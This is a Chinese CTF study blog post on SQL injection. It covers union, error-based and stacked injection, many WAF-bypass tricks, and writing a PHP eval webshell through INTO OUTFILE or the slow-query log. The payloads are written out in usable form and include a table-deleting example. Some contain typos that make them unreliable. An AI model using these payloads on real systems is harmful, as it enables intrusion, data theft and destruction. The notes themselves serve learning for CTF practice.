@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>从零开始的SQL注入生活 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="从零开始的SQL注入生活字义上的从零开始喵。。字义上的私了好多次喵。。。 Episode 1   SQL数据库基础操作 创建  create database_name;#建立一个数据库 create table table_name( column1 datatype, ....... );#建立一个表      查询  show tables; &#x2F;&#x2F;显示当前选中的数据库中的所有表名 selec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的SQL注入生活">
+<meta property="og:url" content="https://ayan0.top/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/index.html">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="从零开始的SQL注入生活字义上的从零开始喵。。字义上的私了好多次喵。。。 Episode 1   SQL数据库基础操作 创建  create database_name;#建立一个数据库 create table table_name( column1 datatype, ....... );#建立一个表      查询  show tables; &#x2F;&#x2F;显示当前选中的数据库中的所有表名 selec">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ayan0.top/img/shiratama.webp">
+<meta property="article:published_time" content="2025-03-09T03:26:48.000Z">
+<meta property="article:modified_time" content="2025-03-09T03:27:31.858Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="-web -CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ayan0.top/img/shiratama.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "从零开始的SQL注入生活",
+  "url": "https://ayan0.top/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/",
+  "image": "https://ayan0.top/img/shiratama.webp",
+  "datePublished": "2025-03-09T03:26:48.000Z",
+  "dateModified": "2025-03-09T03:27:31.858Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "AyaN0",
+      "url": "https://ayan0.top/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '从零开始的SQL注入生活',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/shiratama2.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/shiratama.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/shiratama.jpg" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">从零开始的SQL注入生活</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">从零开始的SQL注入生活</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-09T03:26:48.000Z" title="发表于 2025-03-09 11:26:48">2025-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-09T03:27:31.858Z" title="更新于 2025-03-09 11:27:31">2025-03-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
+<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
+<li><strong>创建</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
+<span class="keyword">create</span> <span class="keyword">table</span> table_name(
+column1 datatype,
+.......
+);#建立一个表
+</code></pre>
+
+
+
+<ul>
+<li><strong>查询</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
+<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
+<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
+<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
+#条件查询<span class="keyword">Where</span>
+(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
+(<span class="number">8</span>)<span class="keyword">NOT</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
+
+<ul>
+<li><strong>插入</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
+<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
+<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
+
+<ul>
+<li><strong>注马</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
+<span class="number">2.</span>利用日志文件写入木马
+<span class="number">1.</span>开启日志功能
+
+<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
+<span class="number">2.</span>设置日志存储路径
+
+<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
+<span class="number">3.</span>执行<span class="keyword">sql</span>语句
+
+<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
+</code></pre>
+
+
+
+<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><ul>
+<li>union注入(-1’)</li>
+</ul>
+<p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
+<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
+<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
+#查完后使用<span class="keyword">select</span> 语句
+<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
+#查库名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
+#查表名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
+#查列名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
+#直接查数据
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#</code></pre>
+
+<ul>
+<li>报错注入</li>
+</ul>
+<p>1.extractvalue函数</p>
+<p>查询对象xml某一个标签的值</p>
+<p>如果查询的标签格式不对，就会报错</p>
+<p>利用concat函数来链接两个字符串</p>
+<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
+<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
+
+<p>-&gt;查询div，~存在会报错</p>
+<p>爆出~database（）</p>
+<p>2.updatexml</p>
+<p>更新xml文档内容</p>
+<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
+<p>同样道理，当没有对应路径的时候会报错</p>
+<p>‘ and updatexml(‘div’, concat(‘~’,database()),’hi’)#</p>
+<p>其他同上</p>
+<ul>
+<li>堆叠注入</li>
+</ul>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
+1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
+设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
+</code></pre>
+
+
+
+<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><h2 id="Episode-4-你好，绕WAF"><a href="#Episode-4-你好，绕WAF" class="headerlink" title="Episode   4  你好，绕WAF"></a>Episode   4  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
+<p>然后可以使用<code>anandd</code>绕过</p>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
+<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
+
+<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
+<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
+<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
+<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
+<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
+<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
+limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
+#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
+<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
+
+<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
+<p>最常见的一个盲注的sql语句：</p>
+<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
+
+<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
+<p>常用注释符：</p>
+<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
+<p>用法：</p>
+<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
+<p>2）使用大小写绕过：</p>
+<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
+<p>3）内联注释绕过：</p>
+<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
+<p>4） 双关键字绕过：</p>
+<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
+<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
+<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
+<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
+<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
+<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
+<h2 id="Episode-5-模糊匹配"><a href="#Episode-5-模糊匹配" class="headerlink" title="Episode 5  模糊匹配"></a>Episode 5  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
+<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
+<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
+<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
+<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
+<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
+<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
+<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
+<h2 id="奇奇怪怪的知识点积累"><a href="#奇奇怪怪的知识点积累" class="headerlink" title="奇奇怪怪的知识点积累"></a>奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
+<p>|| 逻辑或的短路：a||b</p>
+<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
+<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">https://ayan0.top/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web-CTF/">-web -CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/shiratama.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">PHP反序列化</div></div><div class="info-2"><div class="info-item-1">PHP反序列化学习入门之前首先要知道PHP是一门面向对象的语言 所以会碰到类，对象之类的概念 稍微补充一点罢，不然会听不懂的()  类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。 对象 − 是类的实例。 成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。 成员函数 − 定义在类的内部，可用于访问对象的数据。 继承 − 